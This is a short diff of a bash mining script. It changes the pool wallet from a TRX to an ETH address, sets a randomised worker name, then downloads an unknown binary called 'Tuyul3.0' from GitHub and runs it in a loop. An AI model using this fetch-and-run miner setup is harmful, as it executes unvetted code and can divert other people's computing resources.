@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TGqQjwcpN2NHYVHtCc3ZG6FgdEdCr9puJK
-WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#8rgx-in2z)
+WALLET=ETH:0xbe4dbe090f7f304008d25d9861b332f785128c2d
+WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#krig-11q7)
 wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
 chmod +x Tuyul3.0
 while [ 1 ]; do
